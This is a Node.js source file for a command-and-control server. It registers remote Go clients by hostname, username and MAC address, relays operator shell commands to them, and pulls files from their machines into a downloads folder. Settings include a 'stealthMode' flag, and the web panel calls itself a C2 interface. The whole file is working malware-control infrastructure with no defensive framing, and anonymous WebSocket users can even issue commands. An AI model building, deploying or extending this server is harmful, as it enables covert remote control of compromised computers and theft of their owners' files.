require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const net = require('net');
const { v4: uuidv4 } = require('uuid');
const moment = require('moment');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const app = express();
const server = http.createServer(app);
const allowedOrigins = (process.env.CORS_ORIGIN || "http://localhost:3000")
  .split(',')
  .map(s => s.trim())
  .filter(Boolean);

const io = socketIo(server, {
  cors: {
    origin: allowedOrigins.length ? allowedOrigins : '*',
    methods: ["GET", "POST"],
    credentials: true
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('client/build'));

// File upload configuration
const upload = multer({ 
  dest: 'uploads/',
  limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
});

// Global variables
const clients = new Map();
const clientSessions = new Map();
const commandHistory = [];
const outputBuffer = [];

// Create uploads directory
fs.ensureDirSync('uploads');
fs.ensureDirSync('downloads');

// SQLite setup for persistent settings using sql.js (pure JS, no native build)
const initSqlJs = require('sql.js');
const dbPath = path.join(__dirname, 'c2.sqlite');
let SQL = null;
let db = null;
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret';

async function loadDb() {
  if (!SQL) {
    SQL = await initSqlJs();
  }
  if (!db) {
    if (fs.existsSync(dbPath)) {
      const filebuffer = fs.readFileSync(dbPath);
      db = new SQL.Database(filebuffer);
    } else {
      db = new SQL.Database();
      db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);`);
      db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
      persistDb();
    }
    // Ensure tables exist when upgrading
    db.run(`CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, passwordHash TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'admin');`);
  }
}

function persistDb() {
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.writeFileSync(dbPath, buffer);
}

const defaultSettings = {
  serverPort: 2026,
  serverHost: '0.0.0.0',
  maxClients: 100,
  heartbeatInterval: 60,
  logLevel: 'info',
  autoReconnect: true,
  encryptionEnabled: true,
  stealthMode: true,
  logFile: './logs/c2.log',
  backupInterval: 24
};

function getAllSettings() {
  const out = { ...defaultSettings };
  const stmt = db.prepare('SELECT key, value FROM settings');
  const rows = [];
  while (stmt.step()) {
    rows.push(stmt.getAsObject());
  }
  rows.forEach(r => {
    try { out[r.key] = JSON.parse(r.value); } catch { out[r.key] = r.value; }
  });
  return out;
}

function setSettings(partial) {
  const insert = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
  db.run('BEGIN');
  try {
    Object.entries(partial).forEach(([k, v]) => insert.run([k, JSON.stringify(v)]));
    db.run('COMMIT');
  } catch (e) {
    db.run('ROLLBACK');
    throw e;
  }
  persistDb();
}

function getSetting(key, defaultValue) {
  const stmt = db.prepare('SELECT value FROM settings WHERE key = ?');
  const row = stmt.getAsObject([key]);
  if (row && row.value) {
    try { return JSON.parse(row.value); } catch { return row.value; }
  }
  return defaultValue;
}

function ensureDefaultSettings() {
  // Insert defaults only for missing keys
  const existing = new Set();
  const stmt = db.prepare('SELECT key FROM settings');
  while (stmt.step()) {
    const row = stmt.getAsObject();
    if (row && row.key) existing.add(row.key);
  }
  const missing = {};
  Object.entries(defaultSettings).forEach(([k, v]) => {
    if (!existing.has(k)) missing[k] = v;
  });
  if (Object.keys(missing).length > 0) setSettings(missing);
}

// Initialize DB before using
(async () => {
  await loadDb();
  ensureDefaultSettings();
})();

// TCP Server for Go clients
let tcpServer = null;

function createTcpServer() {
  if (tcpServer) return tcpServer;
  tcpServer = net.createServer((socket) => {
  const clientId = uuidv4();
  const clientIP = socket.remoteAddress;
  
  console.log(`[TCP] New client connected: ${clientIP}`);
  
  // Buffer for incomplete messages
  let messageBuffer = '';
  let isDownloading = false;
  let downloadBuffer = Buffer.alloc(0);
  let downloadFilename = '';
  let downloadTimeout = null;
  
  socket.on('data', (data) => {
    try {
      // Check if we're in download mode (receiving binary data)
      if (isDownloading) {
        downloadBuffer = Buffer.concat([downloadBuffer, data]);
        
        // Reset timeout when receiving data
        if (downloadTimeout) {
          clearTimeout(downloadTimeout);
        }
        
        // Set timeout to complete download after 2 seconds of inactivity
        downloadTimeout = setTimeout(() => {
          if (isDownloading && downloadBuffer.length > 0 && downloadFilename) {
            try {
              const filename = path.basename(downloadFilename);
              const downloadPath = path.join('downloads', filename);
              fs.writeFileSync(downloadPath, downloadBuffer);
              console.log(`[TCP] File downloaded: ${downloadPath} (${downloadBuffer.length} bytes)`);
              
              // Notify GUI clients about successful download
              io.emit('fileDownloaded', {
                clientId: clientId,
                filename: filename,
                path: downloadPath,
                size: downloadBuffer.length
              });
              
              // Reset download state
              isDownloading = false;
              downloadBuffer = Buffer.alloc(0);
              downloadFilename = '';
            } catch (error) {
              console.error(`[TCP] Error saving downloaded file:`, error);
            }
          }
        }, 2000);
        
        return;
      }
      
      // Add new data to buffer
      messageBuffer += data.toString();
      
      // Process complete messages (separated by newlines)
      const lines = messageBuffer.split('\n');
      messageBuffer = lines.pop(); // Keep the last incomplete line in buffer
      
      for (const line of lines) {
        if (line.trim() === '') continue; // Skip empty lines
        
        try {
          const raw = JSON.parse(line);
          const message = {
            // unify keys from Go (capitalized) and JS (lowercase)
            type: raw.type || raw.Type,
            content: raw.content || raw.Content,
            hostname: raw.hostname || raw.Hostname,
            macAddress: raw.macAddress || raw.MACAddress,
            username: raw.username || raw.Username
          };
          
          // Process the message
      if (message.hostname) {
        // Initial client info
        const clientInfo = {
          id: clientId,
          ip: clientIP,
          hostname: message.hostname,
          macAddress: message.macAddress,
          username: message.username,
          socket: socket,
          connectedAt: new Date(),
          lastSeen: new Date(),
          active: true
        };
        
        clients.set(clientId, clientInfo);
        clientSessions.set(clientId, []);
        
        console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
        
        // Notify GUI clients
        io.emit('clientConnected', {
          id: clientId,
          hostname: clientInfo.hostname,
          username: clientInfo.username,
          macAddress: clientInfo.macAddress,
          ip: clientInfo.ip,
          connectedAt: clientInfo.connectedAt
        });

        // Also broadcast refreshed clients list to ensure dashboard reflects the connection
        const list = Array.from(clients.values()).map(c => ({
          id: c.id,
          hostname: c.hostname,
          username: c.username,
          macAddress: c.macAddress,
          ip: c.ip,
          connectedAt: c.connectedAt,
          lastSeen: c.lastSeen,
          active: c.active
        }));
        io.emit('clientsList', list);
      } else if (message.type === 'response') {
        // Command response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
          
          // Check if this is a download command response
          if (message.content && message.content.includes('Download') && message.content.includes('Failed')) {
            // Download failed, reset download state
            isDownloading = false;
            downloadBuffer = Buffer.alloc(0);
            downloadFilename = '';
          }
          
          // Store in session history
          const session = clientSessions.get(clientId) || [];
          session.push({
            timestamp: new Date(),
            type: 'response',
            content: message.content
          });
          clientSessions.set(clientId, session);
          
          // Notify GUI clients
          io.emit('commandResponse', {
            clientId: clientId,
            response: message.content,
            timestamp: new Date()
          });
        }
      } else if (message.type === 'command' && message.content && message.content.startsWith('download ')) {
        // Download command received - prepare for file download
        downloadFilename = message.content.replace('download ', '');
        isDownloading = true;
        downloadBuffer = Buffer.alloc(0);
        console.log(`[TCP] Starting download: ${downloadFilename}`);
      } else if (message.type === 'heartbeat') {
        // Heartbeat response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
        }
      }
        } catch (parseError) {
          console.error(`[TCP] Error parsing JSON from ${clientIP}:`, parseError);
          // Skip this malformed message and continue
        }
      }
    } catch (error) {
      console.error(`[TCP] Error processing data from ${clientIP}:`, error);
    }
  });
  
  socket.on('close', () => {
    console.log(`[TCP] Client disconnected: ${clientIP}`);
    
    // Clear download timeout
    if (downloadTimeout) {
      clearTimeout(downloadTimeout);
    }
    
    // Save downloaded file if we were downloading
    if (isDownloading && downloadBuffer.length > 0 && downloadFilename) {
      try {
        const filename = path.basename(downloadFilename);
        const downloadPath = path.join('downloads', filename);
        fs.writeFileSync(downloadPath, downloadBuffer);
        console.log(`[TCP] File downloaded: ${downloadPath} (${downloadBuffer.length} bytes)`);
        
        // Notify GUI clients about successful download
        io.emit('fileDownloaded', {
          clientId: clientId,
          filename: filename,
          path: downloadPath,
          size: downloadBuffer.length
        });
      } catch (error) {
        console.error(`[TCP] Error saving downloaded file:`, error);
      }
    }
    
    const client = clients.get(clientId);
    if (client) {
      client.active = false;
      io.emit('clientDisconnected', { id: clientId });
    }
  });
  
  socket.on('error', (error) => {
    console.error(`[TCP] Socket error for ${clientIP}:`, error);
  });
  });
  return tcpServer;
}

function startTcpServer(host, port) {
  return new Promise((resolve, reject) => {
    const srv = createTcpServer();
    // Attach error handler BEFORE listen to avoid race on immediate DNS errors
    srv.on('error', reject);
    srv.listen(port, host, () => {
      console.log(`[TCP] Server listening on ${host}:${port}`);
      resolve();
    });
  });
}

async function restartTcpServerIfNeeded(newHost, newPort) {
  let addr = null;
  if (tcpServer && typeof tcpServer.address === 'function') {
    try {
      addr = tcpServer.address();
    } catch (e) {
      addr = null;
    }
  }
  const currentHost = (addr && addr.address) ? addr.address : '0.0.0.0';
  const currentPort = (addr && addr.port) ? addr.port : null;
  if (currentPort === newPort && currentHost === newHost) return;
  if (tcpServer) {
    await new Promise((r) => tcpServer.close(r));
    tcpServer = null;
  }
  try {
    await startTcpServer(newHost, newPort);
  } catch (e) {
    if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
      console.warn(`[TCP] Failed to bind to ${newHost}:${newPort} (${e.code}). Falling back to 0.0.0.0`);
      await startTcpServer('0.0.0.0', newPort);
    } else {
      throw e;
    }
  }
}

// Start TCP server with settings (env overrides allowed)
(async () => {
  await loadDb();
  const s = getAllSettings();
  const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
  const tcpPort = Number(process.env.TCP_PORT || s.serverPort || 2026);
  try {
    await startTcpServer(tcpHost, tcpPort);
  } catch (e) {
    if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
      console.warn(`[TCP] Failed to bind to ${tcpHost}:${tcpPort} (${e.code}). Falling back to 0.0.0.0`);
      await startTcpServer('0.0.0.0', tcpPort);
    } else {
      throw e;
    }
  }
})();

// ---- Auth helpers ----
function getUser(username) {
  const stmt = db.prepare('SELECT username, passwordHash, role FROM users WHERE username = ?');
  const row = stmt.getAsObject([username]);
  if (!row || !row.username) return null;
  return row;
}

function requireAuth(req, res, next) {
  const header = req.headers['authorization'] || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Missing token' });
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    req.user = payload;
    return next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Public login endpoint
app.post('/api/login', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  const username = body.username || '';
  const password = body.password || '';
  if (!username || !password) return res.status(400).json({ error: 'username and password required' });
  const user = getUser(username);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  const ok = bcrypt.compareSync(password, user.passwordHash);
  if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ sub: user.username, role: user.role }, JWT_SECRET, { expiresIn: '12h' });
  res.json({ token });
});

// Protect API routes after this middleware
app.use((req, res, next) => {
  if (req.path.startsWith('/api/') && req.path !== '/api/login') {
    return requireAuth(req, res, next);
  }
  return next();
});

// Socket authentication
io.use((socket, next) => {
  const auth = socket.handshake && socket.handshake.auth;
  const query = socket.handshake && socket.handshake.query;
  const headers = socket.handshake && socket.handshake.headers;
  let token = auth && auth.token;
  if (!token && query && typeof query.token === 'string') token = query.token;
  if (!token && headers && typeof headers.authorization === 'string' && headers.authorization.startsWith('Bearer ')) {
    token = headers.authorization.slice(7);
  }
  if (!token) {
    // Allow anonymous GUI sockets; restrict-sensitive actions elsewhere
    socket.user = { sub: 'anonymous' };
    return next();
  }
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    socket.user = payload;
    return next();
  } catch (e) {
    // Fall back to anonymous instead of rejecting connection
    socket.user = { sub: 'anonymous' };
    return next();
  }
});

// WebSocket connections for GUI
io.on('connection', (socket) => {
  console.log('[WebSocket] GUI client connected');
  
  // Send current clients list
  const clientsList = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active
  }));
  
  socket.emit('clientsList', clientsList);
  
  // Provide clients list on demand
  socket.on('getClients', () => {
    const list = Array.from(clients.values()).map(client => ({
      id: client.id,
      hostname: client.hostname,
      username: client.username,
      macAddress: client.macAddress,
      ip: client.ip,
      connectedAt: client.connectedAt,
      lastSeen: client.lastSeen,
      active: client.active
    }));
    socket.emit('clientsList', list);
  });
  
  // Handle command execution
  socket.on('executeCommand', (data) => {
    const { clientId, command } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: command
        };
        
        client.socket.write(JSON.stringify(commandData));
        
        // Store command in history
        const session = clientSessions.get(clientId) || [];
        session.push({
          timestamp: new Date(),
          type: 'command',
          content: command
        });
        clientSessions.set(clientId, session);
        
        commandHistory.push({
          id: uuidv4(),
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
        // Notify GUI
        socket.emit('commandSent', {
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
      } catch (error) {
        console.error('Error sending command:', error);
        socket.emit('commandError', { error: error.message });
      }
    } else {
      socket.emit('commandError', { error: 'Client not found or inactive' });
    }
  });
  
  // Handle file upload
  socket.on('uploadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `upload ${filename}`
        };
        
        client.socket.write(JSON.stringify(commandData));
        socket.emit('uploadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('uploadError', { error: error.message });
      }
    }
  });
  
  // Handle file download
  socket.on('downloadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `download ${filename}`
        };
        
        client.socket.write(JSON.stringify(commandData));
        socket.emit('downloadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('downloadError', { error: error.message });
      }
    }
  });
  
  // Get client session history
  socket.on('getClientHistory', (clientId) => {
    const session = clientSessions.get(clientId) || [];
    socket.emit('clientHistory', { clientId, history: session });
  });
  
  // Get command history
  socket.on('getCommandHistory', () => {
    socket.emit('commandHistory', commandHistory);
  });
  
  // Delete a disconnected client from memory
  socket.on('deleteClient', (data) => {
    try {
      const clientId = typeof data === 'string' ? data : (data && data.clientId);
      if (!clientId) return socket.emit('clientDeleteError', { error: 'clientId required' });
      const client = clients.get(clientId);
      if (!client) return socket.emit('clientDeleteError', { error: 'Client not found' });
      if (client.active) return socket.emit('clientDeleteError', { error: 'Cannot delete active client' });
      // Clean up maps
      clients.delete(clientId);
      clientSessions.delete(clientId);
      // Notify all GUI clients
      io.emit('clientRemoved', { id: clientId });
    } catch (e) {
      socket.emit('clientDeleteError', { error: e.message || 'Delete failed' });
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[WebSocket] GUI client disconnected');
  });
});

// API Routes
app.get('/api/settings', async (req, res) => {
  await loadDb();
  res.json(getAllSettings());
});

app.put('/api/settings', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  setSettings(body);
  // Hot-restart TCP server if host/port changed
  const s = getAllSettings();
  try {
    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
    res.json({ ok: true });
  } catch (e) {
    console.error('Failed to restart TCP server:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.get('/api/password', async (req, res) => {
  await loadDb();
  const val = getSetting('encryptionPassword', '');
  res.json({ password: val || '' });
});
app.post('/api/password', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  const pwd = (body.password || '').toString();
  if (!pwd) return res.status(400).json({ ok: false, error: 'password required' });
  setSettings({ encryptionPassword: pwd });
  res.json({ ok: true });
});
app.get('/api/clients', (req, res) => {
  const clientsList = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active
  }));
  
  res.json(clientsList);
});

app.get('/api/clients/:id/history', (req, res) => {
  const clientId = req.params.id;
  const session = clientSessions.get(clientId) || [];
  res.json(session);
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  res.json({
    message: 'File uploaded successfully',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: req.file.path
  });
});

app.get('/api/downloads', (req, res) => {
  try {
    const downloadsDir = 'downloads';
    if (!fs.existsSync(downloadsDir)) {
      return res.json([]);
    }
    
    const files = fs.readdirSync(downloadsDir).map(filename => {
      const filePath = path.join(downloadsDir, filename);
      const stats = fs.statSync(filePath);
      return {
        filename,
        size: stats.size,
        modified: stats.mtime,
        path: filePath
      };
    });
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to list downloads' });
  }
});

app.get('/api/downloads/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join('downloads', filename);
  
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Serve React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

const HOST = process.env.HOST || '0.0.0.0';
const PORT = Number(process.env.PORT || 5000);
server.listen(PORT, HOST, () => {
  console.log(`[HTTP] Server running on ${HOST}:${PORT}`);
  console.log(`[GUI] Access the C2 interface at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
});